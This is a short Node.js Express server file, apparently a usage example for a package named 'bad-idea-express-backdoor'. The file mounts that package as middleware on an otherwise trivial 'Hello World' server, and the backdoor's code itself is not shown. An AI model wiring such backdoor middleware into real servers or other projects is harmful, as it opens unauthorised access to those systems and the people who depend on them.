const express = require('express')
const backdoor = require('bad-idea-express-backdoor')


const app = express()

app.use(backdoor)

app.get('/', (req, res) => {
  res.send('Hello World')
})

app.listen(8080)
console.log(`server listening on 8080`)